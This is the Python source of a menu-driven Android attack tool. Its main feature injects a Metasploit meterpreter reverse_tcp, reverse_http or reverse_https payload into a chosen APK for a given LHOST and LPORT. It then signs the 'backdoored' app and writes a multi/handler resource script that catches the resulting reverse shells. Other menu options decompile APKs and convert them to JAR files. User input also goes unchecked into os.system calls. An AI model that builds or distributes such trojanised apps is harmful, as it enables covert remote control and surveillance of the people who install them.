#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import shutil
import sys
import time
import progressbar
import time
import readline

from termcolor import cprint
from colorama import init
from pyfiglet import figlet_format

from Resource.Banners import *
from Resource.DIR import *
from Resource.terminal import *

init(strip=not sys.stdout.isatty())

readline.parse_and_bind("tab: complete")

cls()
del_cls()
hacking()
cls()

def start_textart():
    while '1'=='1':
        cls()
        terminal_resize1()
        start_menu()
        choice_1 = raw_input(d_sign1)

        while choice_1 == '1':
            terminal_resize3()
            os.system("python Assest/Resource/hidepyc.py " + dir_path + "/Assest/Resource")
            print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░APK DECOMPILE░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
            derp()
            print('                   ' + d_sign + 'OPTIONS' + d_sign)
            #print(d_sign + apk_directory + alone)
            print(d1_sign + choose_directory)
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    os.system('apktool d '+apk_file)
                    raw_input("Press Enter to continue...")
            elif apk_file == '0':
                    start_textart()
                    pass
            else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
        pass
    
        
        while choice_1 == '2':
            terminal_resize5()
            cls()
            Hello()
            print(d1_sign + choose_directory)
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    terminal_resize8()
                    cls()
                    payload1()
                    P = raw_input("Payload" +d_sign1)
                    if P == '1':
                        P = 'android/meterpreter/reverse_tcp'
                        P_1 = 'set payload android/meterpreter/reverse_tcp\r\n'
                    elif P == '2':
                        P = 'android/meterpreter/reverse_http'
                        P_1 = 'set payload android/meterpreter/reverse_http\r\n'
                    elif P == '3':
                        P = 'android/meterpreter/reverse_https'
                        P_1 = 'set payload android/meterpreter/reverse_https\r\n'
                    else:
                        print (d_sign2), colored('Error', 'red', attrs=['reverse', 'bold'])
                        raw_input("Press Enter to continue...")
                        pass
                    pass

                    cls()
                    print('         ' + d_sign + 'OPTIONS' + d_sign)
                    LHOST = raw_input(" LHOST="+d_sign1)
                    LPORT = raw_input(" LPORT="+d_sign1)
                    cls()
                    terminal_resize6()
                    cls()
                    os.system("ruby Assest/apk-embed-payload.rb "+ apk_file + " LHOST="+LHOST + " LPORT="+LPORT + " -p "+P)
                    raw_input("Press Enter to continue...")
                    terminal_resize7()
                    cls()
                    folder = raw_input('Folder Name: ')
                    os.system('mkdir Assest/' + folder)
                    os.system('mkdir Assest/' + folder + '/output')
                    os.system('mv original*' + ' Assest/' +folder + '/output')
                    os.system('mv payload*' + ' Assest/' +folder + '/output')
                    os.system('find root -name *backdoored.apk -exec mv -t Assest/'+ folder +' {} +')
                    os.system('d2j-apk-sign Assest/' + folder + '/*backdoored.apk')
                    os.system('find . -name *signed.apk -exec mv -t Assest/'+ folder +' {} +')
                    os.system('find Assest/' + folder + ' -name *backdoored.apk -delete')
                    os.system('rm -rf root')
                    f= open('Assest/'+ folder +'/backdoored.rc',"w+")
                    f.write("use exploit/multi/handler \r\n")
                    f.write(P_1)
                    f.write("set "+ 'LHOST ' + LHOST + '\r\n')    
                    f.write("set "+ 'LPORT ' + LPORT + '\r\n')
                    f.write("exploit -j \r\n")
                    f.close()
                    cls()
                    print('The output file will be in Assest/' + folder)
                    raw_input("Press Enter to continue...")
                    cls()

            elif apk_file == '0':
                    start_textart()
                    pass
            elif apk_file == '1':
                    print("PASS!!!!")
                    raw_input("Press Enter to continue...")
            else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
        pass

        cls()
        while choice_1 =='3':
            terminal_resize4()
            print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░!APK-2-JAR!░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
            Bunny()
            print(d1_sign + choose_directory)    
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    os.system('d2j-dex2jar ' + apk_file)
                    raw_input("Press Enter to continue...")
            elif apk_file == '0':
                    start_textart()
                    pass
            else:
                print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                raw_input("Press Enter to continue...")
        pass

        cls()
        while choice_1 == '4':
            terminal_resize9()
            cls()
            sys.exit()
            pass
pass

def Loading():
	with progressbar.ProgressBar(max_value=30) as bar:
		for i in range(30):
			time.sleep(0.1)
			bar.update(i)
		pass
	pass
pass

def terminal_launch():
    os.system('gnome-terminal --hide-menubar')
pass

cls()
terminal_resize2()
hacking()
Loading()   
cls()
terminal_resize1()

while start_textart():
    terminal_resize3()
    cls()
pass
